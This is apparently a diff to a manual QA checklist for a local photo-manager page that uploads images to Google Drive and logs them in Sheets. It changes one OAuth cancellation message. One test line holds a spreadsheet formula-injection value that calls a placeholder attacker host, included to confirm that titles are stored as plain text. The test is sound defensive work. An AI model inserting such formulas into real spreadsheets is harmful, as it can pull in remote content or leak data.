@@ -25,7 +25,7 @@ Open `http://localhost:8000/tools/photo_manager.html` (NOT `file://`).
 - [ ] 30-MP painting upload → Drive file is full resolution, not a thumbnail
 - [ ] Title `=IMPORTDATA("https://evil.example.com")` saves as a literal string in Sheets, no formula
 - [ ] Reload page mid-flow → no stuck spinners, no orphan Drive file with no Sheets row
-- [ ] OAuth popup closed by user → status shows "Sign-in cancelled," no infinite spinner
+- [ ] OAuth popup closed by user → status shows "OAuth cancelled," no infinite spinner
 - [ ] iPhone JPEG with EXIF orientation 6 → preview shows it the right way up, Drive file is also correct
 - [ ] AI offline (Gemini quota / no key) → manual-paste button works as fallback
 - [ ] All form fields keyboard-reachable from the file input through Save
